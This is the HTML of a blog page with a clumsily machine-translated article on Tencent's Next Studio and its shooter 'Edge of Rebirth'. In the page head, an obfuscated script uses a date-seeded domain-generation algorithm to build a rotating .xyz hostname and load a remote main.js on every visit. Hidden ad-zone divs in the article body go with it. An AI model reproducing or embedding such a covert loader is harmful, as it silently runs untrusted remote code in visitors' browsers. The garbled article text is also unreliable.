<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="In this year’s cologne game show, which didn’t last for a long time, I was very surprised that Tencent, a domestic game manufacturer, also participated in the show, and brought an eye-catching game ca">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="In this year’s cologne game show, which didn’t last for a long time, I was very surprised that Tencent, a domestic game manufacturer, also participated in the show, and brought an eye-catching game ca">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c3735046ad934556b33596a23e6579cc.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/e15728e5ecce455bba94d455fcdd0f3c.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c12bea0f91ae48ce9232a449947ae89e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/8b82f1ec2920453bb3ba1b7746f108d3.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/8d4c135359f5412bac93716b80cadc5f.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c766a8ed235f40058f4a8b7eaa3836f8.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/3c3fe1cdf9ae4d4faf04c940696cce9c.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:48.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China">
<meta name="twitter:description" content="In this year’s cologne game show, which didn’t last for a long time, I was very surprised that Tencent, a domestic game manufacturer, also participated in the show, and brought an eye-catching game ca">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c3735046ad934556b33596a23e6579cc.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>In this year’s cologne game show, which didn’t last for a long time, I was very surprised that Tencent, a domestic game manufacturer, also participated in the show, and brought an eye-catching game called “edge of rebirth”, and the developer of this game is our leading role today: next studio. But on the surface, this “rebirth edge” is an eschatological style third person shooting game with the theme of later apocalypse, which has the posture of a 3A masterpiece. Tencent does define this game as a 3A game for publicity. In the eyes of Gu Yu, the project leader of this work, this game is not a 3A at all, but rather a “2A” Game.<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c3735046ad934556b33596a23e6579cc.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>In next’s understanding, the so-called “2A” game   refers to those works that are close to 3a in quality, but not as large as 3a in game volume. For them now, the resources they have are far from enough to support them to make a 3A, so they also call this game 2A works. Perhaps for many players, the name is a little strange, but this studio has a certain reputation in the independent game development field in China long ago. Now they are the most powerful independent game studio under Tencent. Suddenly they want to do 3a, which is a big step. Maybe they want to visit the whole country The play development industry, perhaps only they are the closest to the realization of “China 3A”.<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/e15728e5ecce455bba94d455fcdd0f3c.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>    low key<br>The beginning of everything will go back to the day about two years ago. On the steam platform, a very personalized independent game named “death comes”, which is officially defined as: This is a pixel wind puzzle game with the perspective of “the fourth person”. The price of the game is not expensive, and the pixel wind of the Q version is very pleasant, and the playing rule of the game is that players can’t see it See the God of death, by setting various mechanisms and traps in the scene to cause accidents, trying to kill as many characters as possible in a scene. In other words, some people may not believe that the original intention of the game development is to let players always be alert to the dangerous things and scenes around them in their daily life, and think about the value and significance of life. This game first appeared at Pax West in 2017, but at that time, next studio didn’t get its own exhibition area. Instead, it borrowed a small corner from a small manufacturer to put a notebook for players to experience the game. There were no posters, no licensing. If it wasn’t for several employees to greet outside, no one would notice this place at all.<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c12bea0f91ae48ce9232a449947ae89e.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>Why do they want to appear in such a low-key way as a studio under Tencent? To a large extent, they did so because they were Tencent’s studios. At that time, all the Games associated with the word “Tencent” would bring a layer of negative buffs. Next just didn’t want to be influenced by Tencent’s reputation, which affected the players’ established impression of them. In addition, their Games were more “unconventional”, so they decided to go low-key The result of being too low-key is that they can’t buy a booth. On the second day of the exhibition, Kotaku, a well-known foreign media, took the initiative to report on the game and called it “one of the five best games in Pax West 2017”. The pixel game with brilliant style was so lucky. With the help of many famous game bloggers, more and more players are aware of the name of next, and next is not proud of its short-term success. Instead, it starts to plan more game products and always requires to focus on quality.<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/8b82f1ec2920453bb3ba1b7746f108d3.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>High yield<br>In the following period of time, next has stepped into a high-yield stage, launched several works one after another, and actively participated in various influential game exhibitions in China to expand its reputation. It is worth mentioning that many games in the studio are planned by art designers in the studio, so these games have a very unique style and play method. With more and more kinds of games covered by the studio, the scale of the studio is gradually expanding, ranging from small-scale puzzle to horizontal action rougelite sandbox, which has been tried in the very popular and popular types in the independent game field, and the most popular game in recent period is the main audio puzzle game “doubt” Case chases the sound “and what is worth mentioning most is that all of its original works are independent game of buyout system, without extra krypton content, which makes many players not only sigh: is this Tencent?<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/8d4c135359f5412bac93716b80cadc5f.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>“The pursuit of the suspect”<br>In fact, all of the studios have such excellent creative ability, largely due to the fact that most of the members of the studio are “old Jianghu” from famous game companies all over the world. For example, Shen Li, the general manager of the studio, once participated in engine research and development in Shanghai Ubisoft and epic on the cusp of the times. Therefore, whether in the operation of the studio or in the The development concept of the game has full experience, and other members have some experience in yubimontllier studio, or participated in the development and design of other Tencent games. Although the studio is very young, it is actually crouching tiger and hidden dragon. In their studio business philosophy, everyone is encouraged to participate in the creation of the game. If there are distinctive ideas and design inspiration, they are likely to be put on the official development agenda, even the ideal college students or interns are the same. For example, the highly acclaimed Games “Rainbow Falls” and “Nishan Shaman” are in this way Born in the background.<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/c766a8ed235f40058f4a8b7eaa3836f8.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>Rainbow falling<br>   ambition<br>As the saying goes, if you don’t have a dream to be a human being, it’s no different from saltfish. Even such a studio that focuses on independent games always wants to make 3A games belonging to the Chinese one day. There’s a precedent for 3A games produced by small studios and popular in the world before, such as warframe, a popular 3A online game nowadays, but in different circumstances, In China’s game market, no one wants to earn money by 3A games. 3A means high investment and high risk. If one is not careful, it may capsize. Even Chinese players are not optimistic about China’s 3A games themselves, but borrow the comments of a big man on the Internet: 3a is not a face project, but has real benefits. Throughout the whole game market, many landmark games are 3A games. They represent the wind vane of the industry and the ceiling of the same type of games. They can not only lead the development of the game industry, but also win the appreciation and respect of others. Without the spirit of adventure, these games may never appear.<br><img src="http://maiygu.xyz/2019/11/08/After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China/3c3fe1cdf9ae4d4faf04c940696cce9c.jpg" alt="After making several independent games, I dare to try 3a. Next is perhaps the most ambitious studio in China"><br>In this year’s cologne game show, “the edge of rebirth” is next’s response to the industry. Although their resources are insufficient at this stage, if this problem can be overcome, then it is not difficult to develop a real 3a with the development ability of a studio and the experience of all “old drivers”. “Edge of rebirth” is developed by using the industry’s mainstream unreal 4 engine and supports the current hot RTX ray tracing technology. It has reached a higher level in both art and AI technology of the same type of game in China. However, after the game was released, because of the similarities between this game and many 3A works on the market, it has also been questioned and criticized by many players, but No matter what the conclusion is, at least next proves that China has the ability to develop 3A games with practical actions. In recent years, the popularity and attention of domestic games are also gradually increasing, and a considerable number of players still have high expectations for domestic game packages. No matter how bad Tencent’s reputation, one thing we have to admit is that if China can launch our own 3a, Tencent will certainly be a great contributor.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/Before Apple, jobs was employee 40 of yadali/" rel="next" title="Before Apple, jobs was employee 40 of yadali">
                <i class="fa fa-chevron-left"></i> Before Apple, jobs was employee 40 of yadali
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/After four years, blood source is still full of vitality. Is it just dark style/" rel="prev" title="After four years, blood source is still full of vitality. Is it just dark style">
                After four years, blood source is still full of vitality. Is it just dark style <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
